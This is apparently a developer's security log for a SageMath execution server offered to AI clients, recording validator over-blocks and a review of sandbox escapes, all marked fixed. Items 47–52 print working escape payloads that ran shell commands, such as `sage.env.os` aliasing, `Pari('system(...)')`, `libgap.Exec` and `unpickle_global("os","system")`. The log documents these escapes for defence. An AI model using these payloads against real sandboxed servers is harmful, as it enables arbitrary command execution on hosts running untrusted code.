## 43. The dunder rule refused Sage's own function syntax — high — DONE

Not an escape. The opposite failure, and the one this project's security suite
is structurally unable to see: an over-block that refuses ordinary mathematics.

```
f(x) = x^2 + 1
  -> Blocked Sage code: Access to dunder name '__tmp__' is blocked
```

That is the first function definition in the Sage tutorial, and the way a
physicist writes a potential (`V(r) = -1/r`), a Lagrangian or a Hamiltonian. The
preparser expands it to

```
__tmp__=var("x"); f = symbolic_expression(x**Integer(2) + Integer(1)).function(x)
```

and this server deliberately validates the *preparsed* source — "validate what
will actually run" — so the blanket dunder ban caught the preparser's own
scratch name. Every other name in the expansion (`var`, `symbolic_expression`,
`Integer`) is already allowlisted; `__tmp__` alone was the refusal.

Fixed by allowing that one name in `Store` context only. The preparser never
reads it back, so a caller who writes it themselves gains nothing they did not
already have — the value stored is their own — while a load stays blocked. The
narrowness is the point: allowing dunder *stores* in general would permit
`__builtins__ = {...}`, which is why the rule is one name and one context rather
than one context.

**How it was found, and why it took this long.** Nothing in 683 tests used the
syntax. The security suite asserts refusals, so an over-block passes it by
definition; `test_math_coverage.py` is the counterweight and its preparser table
covered `^`, `1/3`, `R.<t>` and Unicode names but not `f(x) =`. It surfaced on
the first attempt to write a *physics* session — Wien's displacement law, where
one defines the function and maximises it — which is the case for choosing test
scenarios from what users actually do rather than from what the code has
branches for.

Both directions are now regression-tested: the four function-definition forms in
`PREPARSER_FORMS`, and in `test_security_bypass.py` that `__tmp__` cannot be
read in any position, that no other dunder gained a write, and that
`obj.__tmp__ = 1` is still an attribute write on a dunder.

## 44. Two refusals that told a model nothing it could act on — medium — DONE

Found by running the physics and numerics cases against Claude, Gemini and
Codex rather than by reading the code. All three met the same two walls, and the
walls were right — what was wrong was what they said.

**`find_root` could not take an equation.** Kepler's equation is written
`E - e sin E = M`, and that is how every model sent it. The reply was
`invalid syntax (<string>, line 1)`, from `sage_eval` and about a string the
caller never wrote as Python. `solve_equation` has accepted the form since it
was written, so the two tools disagreed about what an equation is. Now split the
same way, and only after the plain expression fails to parse — a keyword
argument (`log(x, base=2) - 1`) contains an `=` and must not be split.

**"Import statements are disabled for Sage executions."** True, deliberate, and
useless. Gemini opens numerical work with `import numpy as np`, and failed
`ext-phys-schrodinger-fd`, `ext-phys-anharmonic` and `ext-phys-bessel-zero` in a
row without ever recovering — while Claude, which does not write the line,
passed all three. The refusal now adds that SageMath is already loaded and names
what to use instead. Re-run against the same model: two of the three pass.

The measurement is the point. This server's clients are models that retry on
what they are told, which the undeclared-symbol message already recognises
("declare it first with `var('w')`"); these two had not been held to the same
standard, and the cost was invisible until a model was actually watched hitting
them. The third case still fails, on `bessel_Jn_zeros` — SciPy's name for
Bessel zeros, which SageMath does not have. That refusal is correct and its
message already says to check the spelling.

Not fixed, and deliberately: the allowlist refusal does not say whether the name
exists in SageMath at all, so a hallucinated name and a genuinely missing one
read alike. Telling them apart means reporting what the namespace holds, and
`test_the_allowlist_message_never_leaks_what_exists` exists to prevent exactly
that.

## 45. A forbidden global shadows an ordinary local — medium — DONE (item 46)

Found by running SageMath's own doctest corpus through the validator: 432,878
examples out of the installed library, 97.81% of the in-scope ones accepted, and
575 of the refusals are one mistake wearing three messages.

```
matrix(QQ, [[1,2],[3,4]]).trace()   -> Access to forbidden function 'trace' is blocked
l = [1,2,3]; l.remove(2)            -> Call to forbidden attribute 'remove' is blocked
db = digraphs.DeBruijn(2, 2)        -> Reference to forbidden name 'db' is blocked
gap = 7; gap - 1                    -> Reference to forbidden name 'gap' is blocked
sol = desolve_system(des, vars, ics)-> Reference to forbidden name 'vars' is blocked
vecs = list(map(range, os))         -> Reference to forbidden module 'os' is blocked
```

The trace of a matrix is not Sage's `trace()` debugger. `list.remove` is not
`os.remove`. `db`, `gap`, `vars`, `os` and `package` are what people call their
variables — `gap` especially, in a project whose own test suite computes prime
gaps. Every one of these is refused because a name that is dangerous at module
scope is unremarkable in the position it is actually used.

**Why it is not fixed in the change that found it.** The rules involved are the
ones that closed items 24 and 33: a forbidden name is forbidden *however it is
spelled*, because `sage.misc.sage_eval.sage_eval("...")` reached the real
function through an attribute chain rooted at the permitted `sage`. Relaxing
attribute access by name would reopen that. And relaxing the bare-name rule for
caller bindings would reopen item 37 — binding is judged statically, so
`if False: db = 1` followed by `db(...)` authorizes a read of the *live* object.

The shape of a fix, for whoever takes it:

* Split `forbidden_call_names` by *why* each entry is there. `eval`, `exec`,
  `getattr`, `__import__` are Python primitives and must stay unspellable. The
  Sage globals — `db`, `gap`, `maxima`, `sh`, `trace`, `load` — are already
  **removed from the worker namespace** by the startup scrub and the reseal, so
  the AST rule for them exists to produce a clear message rather than a
  `NameError`. For that second group the safe test is the one item 37 already
  established: refuse the name when it is *live* (in the withheld set), and let
  a caller create their own when it is not.
* Attribute position is a separate question from name position. `x.trace()` can
  only reach an attribute of `x`; what the item-24 payload needed was a chain
  rooted at a *module*. `forbidden_attribute_parents` already covers the module
  roots.
* `forbidden_attribute_names` needs the same treatment: it exists for
  `os.system` and `os.remove`, and `remove` is also `list.remove`.

Any change here is test-first, verified against real Sage, and must keep every
payload in `test_security_bypass.py` refused. `tests/test_sage_doctest_corpus.py`
holds the counts as `KNOWN_DEBT_RULES` so the debt cannot grow quietly, and
asserts it is still non-zero so this entry cannot outlive the defect.

**Also raised by the same sweep, and deliberately left alone.** `latex(...)` is
the single most-used name the corpus reaches for that this server refuses — 1,203
uses. It was removed alongside `show`, `view` and `html` because that family
writes files or reads the installation; `latex(expr)` itself only builds a
string, and `(x^2+1)._latex_()` is allowed and returns exactly the same thing.
So the capability is present and the idiom is not. Worth a decision rather than
an accident. Same for `_`, the REPL's previous-result name, which the corpus
uses 539 times and a stateful session could plausibly offer.

## 46. Where the policy prohibits more than security requires — medium — DONE

Item 45 named one over-block. This is the whole picture, from categorising all
8,218 refusals the SageMath doctest corpus provokes
(`scripts/analyse_doctest_refusals.py`, SageMath 10.9, 432,878 examples):

| verdict | refusals | share | meaning |
|---|---|---|---|
| deliberate, strong justification | 2,941 | 35.8% | the capability is dangerous and the mathematics is reachable another way |
| not ours | 2,413 | 29.4% | names the doctest created at run time, or examples past the input size limit |
| **deliberate, weak justification** | **2,081** | **25.3%** | intended, but the security content does not hold up |
| **over-block** | **783** | **9.5%** | ordinary code refused because a global's name is unremarkable in the position it is used |

So **a third of everything this server refuses is refused for no strong security
reason**. It breaks into four items, largest first.

**1. `latex(...)` — 1,387 refusals, 16.9% of all of them, the single biggest.**
It was scrubbed alongside `show`, `view` and `html`, which write files or read
the installation. `latex(expr)` does neither: it builds a string. The proof that
the capability is already exposed is that `(x^2+1)._latex_()` is *allowed* and
returns exactly the same thing — so the policy blocks the idiom and ships the
result. The object's surface on 10.9 is `add_macro`,
`add_package_to_preamble_if_available`, `add_to_preamble`, `blackboard_bold`,
`check_file`, `engine`, `eval`, `extra_macros`, `extra_preamble`, `has_file`,
`matrix_column_alignment`, `matrix_delimiters`, `vector_delimiters`. Only `eval`
executes anything, and `eval` is already refused as an attribute name by an
independent rule. Recommendation: allow `latex`, with a test that
`latex.eval(...)` stays refused.

**2. The shadowing class — 783 refusals.** Item 45, now measured in two halves:
447 where the name is used as a *method or a variable* (`x.trace()` 159,
variables called `maxima` 115, `gap` 68, `db` 31, `sh` 14) and 187 where a
forbidden global's name is simply someone's local (`list.remove` 53, `system`
26, `locals` 12, `input` 10, `vars` 9). The remaining 149 are names that exist
in SageMath and nothing offers — `unpickle_global`, `Gp`, `Singular`, `mwrank`
among them, correctly refused, and `lazy_import`, `show_identifiers`, which have
no mathematical content either way.

**3. `_`, the previous-result name — 694 refusals, 8.4%.** Never a security
decision: the worker does not bind it. In a REPL it holds the last value, and
this server is stateful enough to do the same. Either offer it or decline it on
the record; at present it is refused by omission.

**4. `operator.le` and friends — 206 of the 362 module traversals.** `operator`
is a forbidden attribute parent because `operator.attrgetter` was a confirmed
RCE (item 33). But `attrgetter`, `methodcaller` and `itemgetter` are *also*
forbidden by name, independently, so the module ban is buying nothing that the
name ban does not already buy — while refusing `Poset((divisors(30),
operator.le))`, which is how posets are built. Recommendation: allow a named
subset (`le`, `lt`, `ge`, `gt`, `eq`, `ne`, `add`, `sub`, `mul`, `neg`, `and_`,
`or_`, `xor`) rather than the module.

**What the same measurement vindicates.** The external CAS interfaces are 2,153
refusals, and every one of them is worth it: `gap(...)`, `singular(...)`,
`pari(...)` and `maxima(...)` spawn programs with shell escapes, and
`test_the_blocked_interfaces_do_not_block_the_mathematics` shows the mathematics
behind each is reachable in-process — Gröbner bases, character tables, class
numbers, integration, distributions. `attrcall` and the evaluation primitives
(178) are the payloads from items 33 and 35. Imports, dunders, persistence and
`sys`/`subprocess`/`warnings` traversal are each load-bearing. No mathematical
name is missing from the allowlist anywhere in the corpus.

Each of the four items above is a policy change and gets its own test-first
pass, verified against real Sage, with every payload in
`test_security_bypass.py` still refused.

### 46, resolved

All four were changed, test-first, verified against SageMath 10.9, with every
payload in `test_security_bypass.py` still refused. Corpus acceptance went from
**97.81% to 98.39%** — 2,191 refusals removed, a 27% reduction — and the
allowlist gained exactly two names, `latex` and `operator`.

**`latex`** left `_DANGEROUS_BARE_NAMES`. It was there for `latex.eval()`, which
runs the toolchain, and `eval` is refused as an attribute by an independent
rule — so `latex(x^2+1)` works and `latex.eval('\LaTeX')` does not. 1,387
refusals gone.

**The shadowing class.** `db`, `sh`, `trace`, `edit`, `detach` and the eleven CAS
interface spellings left `forbidden_call_names`, on a ground that is now
asserted rather than assumed: every one of them is absent from the worker
namespace *and* from the generated allowlist, so an unbound read is refused by
deny-by-default and a caller's binding creates a fresh name holding their own
value (`test_a_forbidden_name_is_only_released_while_it_is_unreachable`, and
`test_the_released_names_are_absent_from_sage` against the real namespace).

Two of them had to be re-cut where they actually live: `sage` is live and
allowlisted, so `sage.misc.sh.sh('id')` and `sage.misc.trace.trace(code)` were
reachable the moment the names were released — caught by the existing bypass
suite, which is what it is for. Both are now `forbidden_attribute_parents`,
which blocks the *path* and leaves `A.trace()` alone, since only the parents of
an attribute chain are checked. `remove`, `rmdir`, `unlink` and `walk` left
`forbidden_attribute_names`: they were there for `os.remove`, and `os` is
unreadable as a name and forbidden as a parent, so they were reaching nothing
but `list.remove`.

The exemption for a caller-rooted chain excludes any name this server offers, so
`if False: sage = 1` cannot claim `sage` — item 37's trap, in a new place, and
tested.

**`operator`** stays a forbidden parent and stays out of the namespace scrub, so
the module object resolves while every attribute of it is refused *except* the
arithmetic and comparison functions named in
`SecurityPolicy.allowed_module_attributes`. `operator.le` works;
`operator.attrgetter`, `operator.setitem` and `m = operator` do not. A future
Python adding a dangerous function to the module is denied until someone reads
it, which is the same default the caller allowlist uses.

**`_`** is bound by the worker to the previous result, for caller code only —
a tool's generated snippet must not move it, or `_` would mean whichever helper
the model happened to call in between.

**Not changed, and on the record.** `vars`, `locals`, `input` and `eval` stay
refused as identifiers even though they are equally absent from the namespace.
They are the Python evaluation primitives, and this policy is the last thing
between a namespace regression and arbitrary execution; the corpus says the cost
is about 30 examples in 432,878.

**Correction, and it was a live hole.** This entry originally said
`latex.check_file` and `latex.has_file` "read whether a `.sty` exists" and were
"judged not worth a rule". That was wrong. `latex.has_file(name)` runs
`call("kpsewhich %s" % name, shell=True)`, and on 10.9 it executed
`id > /tmp/...` as the container user. Allowlisting `latex` had handed over
every method hanging off the object, which is what allowlisting a *name* always
does when the name is bound to an object rather than a function. The fix is
`SecurityPolicy.call_only_names`: `latex(obj)` is permitted and `latex.anything`
is refused with a message naming the alternative. The lesson generalises beyond
`latex` — before releasing a name, read what the object carries, not what the
call returns.

### 46, second pass: the rest of it

The first pass took the four largest and stopped. Going through every remaining
bucket by the same rule — *does this drop have a strong security justification?*
— found five more, worth 767 refusals.

**`eval`, `vars`, `locals` and `input` as identifiers.** They were kept out of
the first pass as a backstop against a future namespace regression. That
argument does not survive measurement: each is absent from the restricted
builtins, from the worker namespace **and** from the generated allowlist, all
three, so the bare name resolves to nothing and the AST entry bought only a
message. What it cost is mathematics, in SageMath's own doctests:

```
eval = b.multi_point_evaluation(pts);  delta = eval*evec - evec*A   # an eigenvalue
def christoffel(i, j, k, vars, g)                                   # Christoffel symbols
sol = desolve_system(des, vars, ics)
T.process(input)                                                    # an automaton's word
locals['a']
```

They are refused as *attributes* instead — `latex.eval()` runs the LaTeX
toolchain, and that is the demonstrated danger. `getattr` is the counter-example
and stays fully forbidden: it really is in the builtins, because Sage needs it
there, so the bare name really would resolve. A test asserts all four absences
and that one presence, so the ground is checked rather than assumed.

Then narrowed again: `vars`, `locals` and `input` came *out* of the
attribute list too. They were there for symmetry with `eval`, and no reachable
object has a dangerous method by those names, while `f.vars` is the variable
list of a QEPCAD formula. Symmetry is not a security justification.

**`system` as an attribute name.** It was in `forbidden_attribute_names` for
`os.system`, and `os` is unreadable as a name and forbidden as a parent, so it
was reaching nothing but `IntegratedCurve.system()` — the system of ODEs of a
geodesic, 26 times in the corpus. Same argument that had already retired
`remove`, `rmdir`, `unlink` and `walk`; it was simply missed.

**The measurement itself was wrong about `_`.** The corpus sweep validated each
docstring from an empty scope, so it reported 694 refusals of `_` — a name that
works in any real session, since the worker binds it to the previous result. The
harvest now models that, which is what a faithful measurement of a *session*
requires.

**Where this leaves it.** 97.81% → **98.60%**, 8,218 refusals → 5,258, a 36%
reduction, with two names added to the allowlist in total. The shadowing rules
that fired 575 times now fire **5 times in 432,878 examples**, and those five are
`open`, `exec`, `compile`, `globals` and `getattr` — primitives with no
mathematical use. Everything still refused is an external CAS interface (2,153,
each proven to have a working in-process equivalent), module traversal, an
import, a dunder, persistence, a size limit, an undeclared symbol, or a name the
doctest invented and no allowlist could anticipate.

### 46, third pass: the last bucket

Two passes had taken every refusal whose *rule* lacked a justification. What was
left was one bucket nobody had opened: 1,818 refusals of names that are not in
`sage.all` at all, reported only as "not a name this server offers". Splitting
them by where the name is actually defined in the SageMath tree:

| | names | uses | |
|---|---|---|---|
| the doctest invented it at run time | 282 | 1,102 | no allowlist can anticipate a name created by a line that was excluded |
| Sage's own test plumbing | 37 | 178 | `check_pickle`, `sage_getdoc`, `foo` |
| **mathematics behind an import** | **138** | **538** | `real_roots`, `BasisMatroid`, `BinaryCode`, `dimension_cusp_forms`, `modular_decomposition`, `isotopism`, `back_circulant`, `schur_to_hl` |

The third row is the one that would mean mathematics genuinely lost: this server
has no imports, so a name reachable in Sage only behind one is reachable here
not at all.

It is not lost. Almost every one of those is Sage's *internal* spelling, and the
user-facing path to the same mathematics is exported by `sage.all` and offered
here. `test_the_mathematics_behind_an_import_is_still_reachable` computes each
through that path and asserts the result: real root isolation via
`p.roots(ring=RR)` and `p.number_of_real_roots()`, matroid rank, bases and
minors via `Matroid(...)` and the `matroids.` catalog, coding theory via
`codes.`, the three modular-form dimensions as methods on `Gamma0(11)`, modular
decomposition as a method on a graph, Hadamard matrices and MOLS via
`hadamard_matrix` and `designs.`, symmetric function bases, Coxeter groups,
Boolean polynomial rings, p-adic valuations, and the genus of an integral
lattice.

That is the same boundary a Sage user meets at the prompt before they type an
import: what `sage.all` exports. Matching it exactly is the line this server
draws, and it is now a tested line rather than an assumed one.

**The accounting is closed.** Of 374,428 in-scope examples, 5,258 are refused
and every one of them now has a justification that was read rather than assumed:
2,153 external CAS interfaces (each with a working in-process equivalent),
1,102 names the doctest invented, 741 undeclared symbols, 538 internal spellings
of mathematics reachable another way, 190 string-path primitives, 178 test
plumbing, 124 module traversals, 69 file writes, 56 `latex.` attribute reaches,
33 `global` statements, 11 imports, 5 evaluation primitives, 4 `.eval()`
attributes and 3 examples past the input size limit.

## 47. A CAS interface survived every provenance check — high — DONE

Reported by a parallel review of items 45 and 46, and confirmed:
`maxima_calculus` was **offered to callers**. It is a live MaximaLib interface,
and an interface object fabricates attributes on demand, so it answered to
`system`, `unlink`, `remove`, `rmdir`, `walk`, `rmtree`, `popen`, `spawnv`,
`fork` and `execv` — every name item 46 had removed from
`forbidden_attribute_names`. `maxima_calculus.system('id > /tmp/x')` reached
Maxima and died on an ECL internal rather than running a shell, which is luck,
not design.

**Item 46's justification for freeing those names was incomplete.** It said `os`
is unreadable and forbidden as a parent, so nothing dangerous could be reached
through a method of that name. That is true of `os` and says nothing about any
other object. The correct statement is that no *offered object* answers to those
names — a property of the namespace, not of the rules, and now a test:
`test_no_offered_object_answers_to_a_shell_or_filesystem_name`. Everything that
survives it is a combinatorial container whose `.remove` takes a cell out of a
tableau, which is what the names were freed for.

Note that blocking `system` would not have helped. An interface object answers
to *every* attribute, so a name-based rule cannot cover one; the only fix is to
stop offering the object.

**Why every provenance check missed it, which is the general finding.** Three
mechanisms, each defeating classification by `__module__`:

1. `sage/calculus/all.py` does `from .calculus import maxima as maxima_calculus`.
   The name is an *alias*, defined in no module, so a derivation that takes the
   names a module defines can never see it.
2. In `sage.all` it is a `LazyImport`, whose `type(...).__module__` reports
   `sage.misc.lazy_import` rather than what it wraps. 438 of the offered names
   are LazyImports.
3. `sage.interfaces.maxima_lib` cannot be imported on its own — it raises
   `module 'sage' has no attribute 'functions'` — and `_dangerous_sage_names`
   swallowed that with `except Exception: continue`. Adding the module to
   `_DANGEROUS_SAGE_MODULES` therefore removed nothing, silently. That is the
   same shape as `sage.libs.pari.all` in item 34: an entry that looks like
   protection and is not.

Fixed at the derivation rather than by naming one more helper. It now imports
`sage.all` first so the listed modules can load, reports any that still fail
instead of swallowing them, and walks the namespace resolving aliases and
LazyImports to what they actually wrap. That is the 1.8-second cost this
function exists to keep out of worker startup, and it is free here: the
derivation runs in the generator and the drift test, never at start.

`make denylist` then found `maxima_calculus` structurally, along with `logstr`
and `preparser` from `sage.repl.interpreter` — REPL plumbing with no
mathematical content — and 23 more names from `sage.interfaces.maxima_lib`. The
allowlist lost exactly three names on regeneration.

**A fourth place had the same blind spot.** Once the sweep resolved the lazy
imports, `test_no_allowlisted_factory_hands_back_a_dangerous_object` started
seeing eleven objects it had been reading as unresolved LazyImports —
`Automaton.remove_epsilon_transitions`, `RealSet.is_open`,
`CombinatorialSpecies.algebraic_equation_system` among them. All are
mathematics, all are now in the reviewed baseline, and the guard is stronger for
seeing them: it had been under-testing by exactly that much.

## 48. The denylist did not cover sage_eval — high — DONE

Raised by the same review as item 47, asking why `maxima_calculus.system(...)`
reached Maxima at all before dying on an ECL internal — refused, but at the
fragment gate, "the second line of defence, not the first". Chasing that found
there was no first line on that path at all.

Caller code runs `exec` against the worker namespace, so scrubbing the namespace
protects it. A tool's fragment does not. Every generated template is built on
`sage_eval`, and **`sage_eval` resolves against `sage.all`'s own globals**,
never consulting the namespace it is handed. With the namespace scrubbed clean:

```
sage_eval('unpickle_global')   -> cython_function_or_method
sage_eval('cython')            -> LazyImport
sage_eval('sh')                -> Sh
sage_eval('os')                -> module
sage_eval('attrcall')          -> function
```

Every name the denylist removes, reachable. 145 of them.

**Nothing was exploitable, and that is the whole distinction worth drawing.** A
caller string reaching a template must pass `_validated_expression` first, which
enforces the allowlist, and a structural test refuses any template that
interpolates without a gate. So the door was shut — by one lock. This file's
model is that the object should not be there either, and on that path it was.

The scrub now removes the names from `sage.all` as well as from the namespace.
Process-local and deliberate: a worker whose job is running untrusted
mathematics has no business keeping a shell in its copy of the module.

**What it cost to get right.** The first attempt stripped `sage_eval` itself —
it comes from `sage.misc.sage_eval`, which the denylist removes wholesale — and
broke all 31 Sage-backed tools at once, 55 failures, because every template does
`from sage.all import sage_eval`. The names generated code imports by name are
now held back explicitly: `sage_eval`, `preparse`, `sage_input`, `latex`.
Callers cannot reach any of them — the first three are forbidden call names and
no import of theirs survives validation.

`prelude-reseal.patch` is deleted rather than applied. Resealing the namespace
before the caller's fragment runs could not have closed this: `sage_eval` was
never reading the namespace.

---

# Review actions — 2026-08-15

Findings from a security review of the 100-commit range `HEAD~100..HEAD` (the
range that split `server.py` into `app`/`runtime`/`codegen` and the `tools`
package, generated the allowlist, and relaxed items 45 and 46). Nine findings,
all open. Eight are sandbox escapes; the ninth is a cross-client authorization
break.

**Four were reproduced end to end against real SageMath 10.9 in the `sage-mcp`
container and actually ran a shell as uid 1001** — items 49, 50, 51 and 53. Four
more (52, 54, 55, 56) were verified against the real validator and the real
fragment gate in pure Python, with the runtime half argued from this repo's own
recorded behaviour rather than executed; each says which half is which. Item 57
was verified by reading the installed MCP SDK.

Severity is about consequence, not effort. Nothing below is fixed.

| # | Severity | Item | Status |
|---|----------|------|--------|
| 49 | **Critical** | The terminal segment of an attribute chain is never checked | **done** |
| 50 | **Critical** | `Pari`/`PariRing`/`PariGroup` reconstruct the `pari` singleton the denylist removed | **done** |
| 51 | **Critical** | `libgap` answers to `Exec`, and only `eval` was ever blocked | **done** |
| 52 | **Critical** | Aliasing the `sage` module disables the parent-attribute rule entirely | **done** |
| 53 | **Critical** | `Dokchitser(...).gp()` hands back the interface the denylist removed | **done** |
| 54 | **Critical** | The fragment gate accepts bare `eval`, and none of the three locks apply there | **done** |
| 55 | **Critical** | A comment-hidden payload becomes code when the template splits on `=` | **done** |
| 56 | **Critical** | Unparseable fragments are returned verbatim into statement position | **done** |
| 57 | High | The session resource publishes every live MCP session ID | **done** |

**What these have in common, which is the finding behind the findings.** Six of
the eight escapes are the same shape as something already in this file, one
displacement away:

- Item 34 said a provenance entry that matches no names is not protection. Item
  50 is that again, one level down: a name that *is* removed is not protection
  either, if an offered constructor holds a module-level reference to it.
- Item 47 said an interface object answers to every attribute, so the fix is to
  stop offering the object. Item 51 is that same object class, offered — and
  item 53 is a *method* that hands one back, which no name-based rule covers.
- Item 37 closed re-claiming a name the namespace already had. Item 52 is the
  same trapdoor reached by aliasing instead of re-claiming.
- Item 46 freed names on the argument that the objects behind them are gone.
  Items 49 and 53 are two more places where the object is not gone.

The pattern is that every one of these was closed *by name* and reopened *by
reference*. A name-based rule over a namespace this large keeps losing to the
object graph behind it.

## 49. The terminal segment of an attribute chain is never checked — **critical** — DONE

**Verified end to end against real Sage; ran a shell.**

`security.py:1068` loops `for segment in segments[:-1]`, so the last segment of
a chain is never tested against `forbidden_attribute_parents`. For
`sage.env.os` the segments are `['sage', 'env', 'os']` and `os` is terminal, so
it walks straight through. Nothing else catches it:

- `forbidden_call_names` — `os` absent
- `forbidden_attribute_only_names` = `("eval",)` — no
- `forbidden_attribute_names` — `system`, `remove` and `unlink` were removed by
  item 46 (`security.py:280-310`), on the argument that "`os.system(...)`
  cannot be spelled at all"
- the bare-`os` rule at `:1112` — fires on `ast.Name` only, and the payload
  never writes a bare `os`

Assignment then launders the module object into an ordinary local, and the
`caller_owned` exemption means no later rule inspects it.

The asymmetry is the tell:

```
ALLOWED : m = sage.env.os
          m.system("id")
ALLOWED : p = sage.env.sys
          p.modules["os"].system("id")
BLOCKED : sage.env.os.environ        # terminal is .environ, so os IS in segments[:-1]
BLOCKED : sage.env.os.system("id")   # same reason
```

In the container, through `_build_namespace()` + `_execute(...)`, both payloads
returned `{'ok': True}` and wrote `uid=1001(sage) gid=1001(sage) groups=1001(sage)`.

`_strip_from_sage_all` (`_sage_worker.py:408-438`) only deletes keys from
`sage.all.__dict__`; it never touches submodule attributes, so `sage.env.os` is
`<module 'os'>` at runtime and `.system` is the builtin.

**`sage` is not the only root.** Enumerating allowlisted module objects in the
live namespace, `desolvers` also exposes `desolvers.os` and `desolvers.shutil`,
and `m = desolvers.os; m.system(...)` executed the shell too. Patching
`sage.env` alone leaves the class of bug intact.

### Suggested fix

Iterate all `segments`, not `segments[:-1]`, for forbidden module names — then
`sage.env.os` is refused exactly as `sage.env.os.environ` already is. Keep the
`caller_owned` root exemption so `sh = 2; sh.bit_length()` still works (but see
item 52, which is about that exemption). Defence in depth: extend the scrub to
null out forbidden submodule attributes (`sage.env.os`, `desolvers.os`) rather
than only `sage.all.__dict__`.

### How to verify

Regression tests for `m = sage.env.os; m.system(...)`, the
`sage.env.sys.modules["os"]` subscript path, and `desolvers.os.system(...)`.
Each must fail before the fix. The existing tests
(`tests/test_security_bypass.py:34`, `tests/test_security.py:254`) only cover
chains where the forbidden module is a *middle* segment — that is exactly the
gap.

## 50. `Pari`, `PariRing` and `PariGroup` reconstruct the removed `pari` — **critical** — DONE

**Verified end to end against real Sage; ran a shell.**

`_sage_worker.py:170` removes the bare name for a recorded reason:

```
    "pari",         # pari('system("id")') ran a shell command as the container user
```

`allowlist.py:184` then offers the capitalized forms:

```
    "ParametrizedSurface3D", "Parent", "Pari", "PariError", "PariGroup", "PariRing",
```

The offered `Pari` is **not** `cypari2.Pari` — its `__module__` is
`sage.rings.pari_ring`. That module does `from sage.libs.pari import pari` at
module scope, and `Pari.__init__` does `self.__x = pari(x)`. Deleting the name
from the worker namespace and from `sage.all` cannot reach a reference another
module already holds. `sage/groups/pari_group.py:27` does the same thing, and
`PariRing()(s)` routes to `Pari(s)`.

Through `_execute(..., trusted=False)` — the real untrusted path, normalization
and `validate_code` included:

```
code:  Pari('system("id > /tmp/pwn_e2e")')
       {'ok': True, 'result_type': 'expression', 'result': '0'}
       marker: uid=1001(sage) gid=1001(sage) groups=1001(sage)
```

`PariRing()('system("touch ...")')` and `PariGroup('system(...)', 1)` also
succeed. PARI's `secure` default is not set in this build, so `system()` shells
out.

Allowlist membership proves runtime reachability here, which is worth stating
plainly: `scripts/generate_allowlist.py` calls `_build_namespace()`, so the list
is derived *after* both scrubs. Every name in `allowlist.py` is by construction
a name that survived.

### Suggested fix

Add `sage.rings.pari_ring` and `sage.groups.pari_group` to
`_DANGEROUS_SAGE_MODULES`. Unlike the `sage.libs.pari.all` entry from item 34,
these modules genuinely *define* the three names, so the provenance derivation
will remove them and the "entry that matches nothing" integration test will
pass. Regenerate with `make allowlist`.

### How to verify

A bypass test asserting all three constructions are refused. Then the general
sweep this implies: grep the modules that define allowlisted names for
`pari(`, `maxima(`, `gp(` — any offered callable that passes a caller string to
a removed singleton is equivalent to the removed name.

## 51. `libgap` answers to `Exec`, and only `eval` was ever blocked — **critical** — DONE

**Verified end to end against real Sage; ran a shell.**

`allowlist.py:376` offers `libgap`, and `security.py:417-420` *recommends* it in
the refusal text shown when `gap` is withheld:

```python
"gap": "SymmetricGroup(5), PermutationGroup([...]) and the group methods, "
       "or libgap(...) for GAP itself",
"gap3": "the native group methods, or libgap(...)",
"libgap": "libgap is available; the group methods usually answer directly",
```

`libgap` is a `sage.libs.gap.libgap.Gap`, whose `__getattr__` resolves any GAP
global. GAP ships `Exec`, which runs a command in the OS shell, and `Process`.
`libgap.eval(...)` is blocked — but only because `eval` happens to be the sole
entry in `forbidden_attribute_only_names` (`security.py:279`). `Exec`,
`Process` and `function_factory` are in no denylist:

```
ALLOWED : libgap.Exec("id")
ALLOWED : libgap.function_factory("Exec")("id")
ALLOWED : libgap.Process(...)
BLOCKED : libgap.eval('Exec("id")')
```

Through the worker JSON protocol, untrusted `execute`:

```
libgap.Exec              -> {"ok": true, "result": "1"}   uid=1001(sage)...
libgap.function_factory  -> {"ok": true, "result": "1"}   uid=1001(sage)...
```

In-process libgap still forks and execs — GAP's `Exec` is built on the kernel
`Process` primitive, which is linked into the library.

`function_factory` is a documented public method that resolves a GAP global
**from a string**. That is structurally an `attrgetter`, which item 33 refused
outright as a class.

The irony is sharp and worth recording: `tests/test_security_bypass.py:450`
already asserts `gap('Exec("id")')` is blocked. The project identified GAP's
`Exec` as a shell escape, removed the subprocess interface, and then offered the
in-process one with attribute access to the same function — and told callers to
use it.

### Suggested fix

Item 47 already wrote the rule: an interface object answers to every attribute
name, so no name-based attribute rule can cover it, and the fix is to stop
offering the object. Add `sage.libs.gap.libgap` to `_DANGEROUS_SAGE_MODULES` (or
`libgap` to `_DANGEROUS_BARE_NAMES`), regenerate, and correct the three
`_NATIVE_EQUIVALENTS` entries so the refusal text stops recommending the escape.
`tests/test_sage_doctest_corpus.py:511` (`libgap(5).Factorial()`) needs updating
with it.

If libgap must stay for group theory, the only sound form is a wrapper enforcing
an **allowlist** of permitted GAP function names. A denylist cannot work here
for the same reason it could not work for `maxima_calculus`.

## 52. Aliasing the `sage` module disables the parent rule — **critical** — DONE

**Verified against the real validator; runtime reachability argued from the
repo's own comments and the generated allowlist, not executed.**

`security.py:1061-1067`:

```python
root = segments[0] if segments else ""
caller_owned = bool(policy.enforce_name_allowlist and root
                    and root in bound and root not in policy.allowed_names)
for segment in segments[:-1]:
    if segment in policy.forbidden_attribute_parents and not caller_owned:
```

`caller_owned` is decided by the root identifier's **spelling**, not by the
value it holds, and `bound` is every name bound anywhere in the module —
including in `if False:` branches, function defaults and comprehension targets.
So binding any fresh name to the allowlisted `sage` module object marks the
entire chain caller-owned and skips the parent check:

```
ALLOWED : s = sage
          s.misc.persist.unpickle_global("os","system")("id")
ALLOWED : s = sage
          s.misc.sh.sh("id")
ALLOWED : f = sage.misc.persist
          f.unpickle_global("os","system")("id")
ALLOWED : def g(s=sage): return s.misc.persist.unpickle_global("os","system")("id")
          g()
ALLOWED : [s.misc.persist.unpickle_global("os","system")("id") for s in [sage]]
BLOCKED : sage.misc.persist.unpickle_global("os","system")("id")   # unaliased only
BLOCKED : if False: sage = 1
          sage.misc.sh.sh("id")                                    # item 37's trap only
```

Passing `withheld_names` changes nothing — that rule is an `ast.Name` rule and
never sees an attribute segment.

The `_bound_names` docstring (`security.py:684-694`) states the assumption that
fails: *"the caller's binding is their own value, and the dangerous originals
are gone from the namespace."* Both halves are false here. `s` holds the genuine
`sage` module, and the originals are not gone — the scrub only cleans
`sage.all.__dict__`, never `sage.misc.persist.__dict__`.

Item 37 closed the adjacent case. `tests/test_math_coverage.py:600-614`
(`test_the_item_46_relaxations_opened_nothing`) tests `if False: sage = 1` then
`sage.misc.sh.sh('id')`, and `sage.misc.trace.trace(...)` followed by
`sage = 1` — but never the aliased form. The alias tests in
